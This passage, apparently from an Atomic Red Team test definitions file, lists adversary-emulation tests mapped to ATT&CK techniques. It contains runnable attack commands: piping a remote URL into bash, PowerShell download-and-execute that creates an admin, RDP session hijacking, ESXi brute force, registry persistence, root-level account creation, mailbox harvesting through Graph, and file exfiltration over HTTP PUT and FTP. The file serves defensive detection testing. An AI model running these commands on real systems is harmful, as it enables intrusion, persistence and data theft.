				"prereq_command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
				"get_prereq_command": "pkg update && pkg install -y sudo curl bash\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
			"cleanup_command": "rmuser -y art\n"
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "ESXi - Brute Force Until Account Lockout",
		"auto_generated_guid": "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"plink_file": {
				"description": "Path to Putty",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"lockout_threshold": {
				"description": "Specify the account lockout threshold configured on the ESXI management server",
				"type": "string",
				"default": "5"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The plink executable must be found in the ExternalPayloads folder.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "RDP hijacking",
		"auto_generated_guid": "a37ac520-b911-458e-8aed-c5f1576d9f46",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Session_ID": {
				"description": "The ID of the session to which you want to connect",
				"type": "string",
				"default": "1337"
			},
			"Destination_ID": {
				"description": "Connect the session of another user to a different session",
				"type": "string",
				"default": "rdp-tcp#55"
			}
		},
		"executor": {
			"command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n",
			"cleanup_command": "sc.exe delete sesshijack >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1563.002",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Chrome/Chromium (Developer Mode)",
		"auto_generated_guid": "3ecd790d-2617-4abf-9a8c-4e8d47da9ee1",
		"supported_platforms": ["linux", "windows", "macos"],
		"executor": {
			"steps": "1. Navigate to [chrome://extensions](chrome://extensions) and\ntick 'Developer Mode'.\n\n2. Click 'Load unpacked extension...' and navigate to\n[Browser_Extension](../t1176/src/)\n\n3. Click 'Select'\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1176",
		"phases": ["persistence"]
	},
	{
		"name": "Chrome/Chromium (Chrome Web Store)",
		"auto_generated_guid": "4c83940d-8ca5-4bb2-8100-f46dc914bc3f",
		"supported_platforms": ["linux", "windows", "macos"],
		"executor": {
			"steps": "1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend\nin Chrome\n\n2. Click 'Add to Chrome'\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1176",
		"phases": ["persistence"]
	},
	{
		"name": "Firefox",
		"auto_generated_guid": "cb790029-17e6-4c43-b96f-002ce5f10938",
		"supported_platforms": ["linux", "windows", "macos"],
		"executor": {
			"steps": "1. Navigate to [about:debugging](about:debugging) and\nclick \"Load Temporary Add-on\"\n\n2. Navigate to [manifest.json](./src/manifest.json)\n\n3. Then click 'Open'\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1176",
		"phases": ["persistence"]
	},
	{
		"name": "Edge Chromium Addon - VPN",
		"auto_generated_guid": "3d456e2b-a7db-4af8-b5b3-720e7c4d9da5",
		"supported_platforms": ["windows", "macos"],
		"executor": {
			"steps": "1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj\nin Edge Chromium\n\n2. Click 'Get'\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1176",
		"phases": ["persistence"]
	},
	{
		"name": "Google Chrome Load Unpacked Extension With Command Line",
		"auto_generated_guid": "7a714703-9f6b-461c-b06d-e6aeac650f27",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"working_dir": {
				"description": "Working directory where the files will be downloaded and extracted",
				"type": "string",
				"default": "$env:TEMP"
			}
		},
		"executor": {
			"command": "\n# Chromium\n$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"\n\n# uBlock Origin Lite to test side-loading\n$extension = \"https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip\"\n\nSet-Location \"#{working_dir}\"\n\nSet-Variable ProgressPreference SilentlyContinue\nInvoke-WebRequest -URI $chromium -OutFile \"#{working_dir}\\chrome.zip\"\nInvoke-WebRequest -URI $extension -OutFile \"#{working_dir}\\extension.zip\"\n\n\nExpand-Archive chrome.zip -DestinationPath \"#{working_dir}\" -Force\nExpand-Archive extension.zip -Force\n\nStart-Process .\\chrome-win\\chrome.exe --load-extension=\"#{working_dir}\\extension\\\" -PassThru",
			"cleanup_command": "Set-Location \"#{working_dir}\"\nStop-Process -Name chrome -Force\nRemove-Item .\\chrome.zip, .\\chrome-win, .\\extension, .\\extension.zip -Recurse -Force\nSet-Variable ProgressPreference Continue",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1176",
		"phases": ["persistence"]
	},
	{
		"name": "Code Signing Policy Modification",
		"auto_generated_guid": "bb6b51e1-ab92-45b5-aeea-e410d06405f8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "bcdedit /set testsigning on",
			"cleanup_command": "bcdedit /set testsigning off",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1553.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Email Collection with PowerShell Get-Inbox",
		"auto_generated_guid": "3f1b5096-0139-4736-9b78-19bcb02bb1cb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "string",
				"default": "$env:TEMP\\mail.csv"
			},
			"file_path": {
				"description": "File path for Get-Inbox.ps1",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1114.001\\src"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Get-Inbox.ps1 must be located at #{file_path}\n",
				"prereq_command": "if (Test-Path \"#{file_path}\\Get-Inbox.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1\" -OutFile \"#{file_path}\\Get-Inbox.ps1\"\n"
			}
		],
		"executor": {
			"command": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}\n",
			"cleanup_command": "Remove-Item #{output_file} -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1114.001",
		"phases": ["collection"]
	},
	{
		"name": "Persistence with Custom AutodialDLL",
		"auto_generated_guid": "aca9ae16-7425-4b6d-8c30-cad306fdbd5b",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n",
				"prereq_command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"\n"
			}
		],
		"executor": {
			"command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n",
			"cleanup_command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value  $env:windir\\system32\\rasadhlp.dll",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)",
		"auto_generated_guid": "a574dafe-a903-4cce-9701-14040f4f3532",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command": {
				"description": "Command to Execute",
				"type": "string",
				"default": "notepad.exe"
			}
		},
		"executor": {
			"command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"",
			"cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)",
		"auto_generated_guid": "36b8dbf9-59b1-4e9b-a3bb-36e80563ef01",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command": {
				"description": "Command to Execute",
				"type": "string",
				"default": "notepad.exe"
			}
		},
		"executor": {
			"command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"",
			"cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "WMI Invoke-CimMethod Start Process",
		"auto_generated_guid": "adae83d3-0df6-45e7-b2c3-575f91584577",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dest": {
				"description": "destination computer name",
				"type": "string",
				"default": "localhost"
			},
			"password": {
				"description": "password for account",
				"type": "string",
				"default": "P@ssword1"
			},
			"username": {
				"description": "account to use",
				"type": "string",
				"default": "Administrator"
			},
			"process": {
				"description": "process to spawn",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "# Set the remote computer name and credentials\n $RemoteComputer = \"#{dest}\"\n $PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"#{process}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n"
		},
		"attack_technique": "T1546",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "IcedID Botnet HTTP PUT",
		"auto_generated_guid": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file": {
				"description": "Exfiltration File",
				"type": "string",
				"default": "C:\\temp\\T1020_exfilFile.txt"
			},
			"domain": {
				"description": "Destination Domain",
				"type": "url",
				"default": "https://google.com"
			}
		},
		"executor": {
			"command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
			"cleanup_command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1020",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration via Encrypted FTP",
		"auto_generated_guid": "5b380e96-b0ef-4072-8a8e-f194cb9eb9ac",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sampleFile": {
				"description": "Path of the sample file to exfiltrate.",
				"type": "String",
				"default": "C:\\temp\\T1020__FTP_sample.txt"
			},
			"ftpServer": {
				"description": "FTP server URL.",
				"type": "Url",
				"default": "ftp://example.com"
			},
			"credentials": {
				"description": "FTP server credentials.",
				"type": "String",
				"default": "[user:password]"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{sampleFile}\" -Value $sampleData\n$ftpUrl = \"#{ftpServer}\"\n$creds = Get-Credential -Credential \"#{credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{sampleFile}\" -Credential $creds\n",
			"cleanup_command": "Remove-Item -Path \"#{sampleFile}\" -ErrorAction Ignore\n"
		},
		"attack_technique": "T1020",
		"phases": ["exfiltration"]
	},
	{
		"name": "Indirect Command Execution - pcalua.exe",
		"auto_generated_guid": "cecfea7a-5f03-4cdd-8bc8-6f7c22862440",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload_path": {
				"description": "Path to payload",
				"type": "path",
				"default": "C:\\Windows\\System32\\calc.exe"
			},
			"process": {
				"description": "Process to execute",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"command": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1202",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Indirect Command Execution - forfiles.exe",
		"auto_generated_guid": "8b34a448-40d9-4fc3-a8c8-4bb286faf7dc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process": {
				"description": "Process to execute",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1202",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Indirect Command Execution - conhost.exe",
		"auto_generated_guid": "cf3391e0-b482-4b02-87fc-ca8362269b29",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process": {
				"description": "Process to execute",
				"type": "string",
				"default": "notepad.exe"
			}
		},
		"executor": {
			"command": "conhost.exe \"#{process}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1202",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Indirect Command Execution - Scriptrunner.exe",
		"auto_generated_guid": "0fd14730-6226-4f5e-8d67-43c65f1be940",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload_path": {
				"description": "Path to the executable",
				"type": "String",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "Scriptrunner.exe -appvscript \"#{payload_path}\"",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1202",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Office365 - Remote Mail Collected",
		"auto_generated_guid": "36657d95-d9d6-4fbf-8a31-f4085607bafd",
		"supported_platforms": ["office-365"],
		"input_arguments": {
			"username": {
				"description": "Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All and Application.ReadWrite.All Scope (eg, Global Administrator Role) and sign-in method is password",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Entra user password",
				"type": "string",
				"default": null
			},
			"1st_target_mailbox": {
				"description": "office-365 target_email_address",
				"type": "string",
				"default": null
			},
			"2nd_target_mailbox": {
				"description": "office-365 target_email_address",
				"type": "string",
				"default": null
			},
			"3rd_target_mailbox": {
				"description": "office-365 target_email_address",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Graph PowerShell SDK must be installed.\n",
				"prereq_command": "$RequiredModule = Get-InstalledModule Microsoft.Graph\nif (-not $RequiredModule) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module Microsoft.Graph -Scope CurrentUser\n"
			},
			{
				"description": "Az.Accounts module must be installed.\n",
				"prereq_command": "$RequiredModule2 = Get-InstalledModule Az.Accounts\nif (-not $RequiredModule2) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module Az.Accounts -Scope CurrentUser\n"
			}
		],
		"executor": {
			"command": "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2 = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n",
			"cleanup_command": "connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome\nRemove-MgApplication $app.AppId\nRemove-Item -Path Cert:\\CurrentUser\\My\\$($cert.thumbprint) -DeleteKey\nDisconnect-MgGraph\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1114.002",
		"phases": ["collection"]
	},
	{
		"name": "Create a user account on a Linux system",
		"auto_generated_guid": "40d8eabd-e394-46f6-8785-b9bfa1d011d2",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "evil_user"
			}
		},
		"executor": {
			"command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n",
			"cleanup_command": "userdel #{username}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a user account on a FreeBSD system",
		"auto_generated_guid": "a39ee1bc-b8c1-4331-8e5f-1859eb408518",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "evil_user"
			}
		},
		"executor": {
			"command": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\n",
			"cleanup_command": "rmuser -y #{username}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a user account on a MacOS system",
		"auto_generated_guid": "01993ba5-1da3-4e15-a719-b690d4f0f0b2",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "evil_user"
			},
			"realname": {
				"description": "'realname' to record when creating the user",
				"type": "string",
				"default": "Evil Account"
			}
		},
		"executor": {
			"command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n",
			"cleanup_command": "dscl . -delete /Users/#{username}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new user in a command prompt",
		"auto_generated_guid": "6657864e-0323-4206-9344-ac9cd7265a4f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "T1136.001_CMD"
			},
			"password": {
				"description": "Password of the user to create",
				"type": "string",
				"default": "T1136.001_CMD!"
			}
		},
		"executor": {
			"command": "net user /add \"#{username}\" \"#{password}\"\n",
			"cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new user in PowerShell",
		"auto_generated_guid": "bc8be0ac-475c-4fbf-9b1d-9fffd77afbde",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "T1136.001_PowerShell"
			}
		},
		"executor": {
			"command": "New-LocalUser -Name \"#{username}\" -NoPassword\n",
			"cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new user in Linux with `root` UID and GID.",
		"auto_generated_guid": "a1040a30-d28b-4eda-bd99-bb2861a4616c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "butter"
			},
			"password": {
				"description": "Password of the user to create",
				"type": "string",
				"default": "BetterWithButter"
			}
		},
		"executor": {
			"command": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n",
			"cleanup_command": "userdel #{username}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new user in FreeBSD with `root` GID.",
		"auto_generated_guid": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "butter"
			},
			"password": {
				"description": "Password of the user to create",
				"type": "string",
				"default": "BetterWithButter"
			}
		},
		"executor": {
			"command": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n",
			"cleanup_command": "pw userdel #{username}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new Windows admin user",
		"auto_generated_guid": "fda74566-a604-4581-a4cc-fbbe21d66559",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "T1136.001_Admin"
			},
			"password": {
				"description": "Password of the user to create",
				"type": "string",
				"default": "T1136_pass"
			}
		},
		"executor": {
			"command": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n",
			"cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new Windows admin user via .NET",
		"auto_generated_guid": "2170d9b5-bacd-4819-a952-da76dae0815f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1136.001",
		"phases": ["persistence"]
	},
	{
		"name": "Permission Groups Discovery (Local)",
		"auto_generated_guid": "952931a4-af0b-4335-bbbe-73c8c5b327ae",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "Basic Permission Groups Discovery Windows (Local)",
		"auto_generated_guid": "1f454dd6-e134-44df-bebb-67de70fb6cd8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net localgroup\nnet localgroup \"Administrators\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "Permission Groups Discovery PowerShell (Local)",
		"auto_generated_guid": "a580462d-2c19-4bc7-8b9a-57a41b7d3ba4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "get-localgroup\nGet-LocalGroupMember -Name \"Administrators\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "SharpHound3 - LocalAdmin",
		"auto_generated_guid": "e03ada14-0980-4107-aff1-7783b2b59bb1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "FQDN of the targeted domain",
				"type": "string",
				"default": "$env:UserDnsDomain"
			},
			"sharphound_path": {
				"description": "SharpHound Windows executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe"
			},
			"output_path": {
				"description": "Output for SharpHound",
				"type": "path",
				"default": "$env:TEMP\\SharpHound\\"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "SharpHound binary must exist on disk and at specified location (#{sharphound_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
				"prereq_command": "if (Test-Path \"#{sharphound_path}\") { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/BloodHoundAD/BloodHound/blob/e062fe73d73c015dccb37fae5089342d009b84b8/Collectors/SharpHound.exe?raw=true\" -OutFile \"#{sharphound_path}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
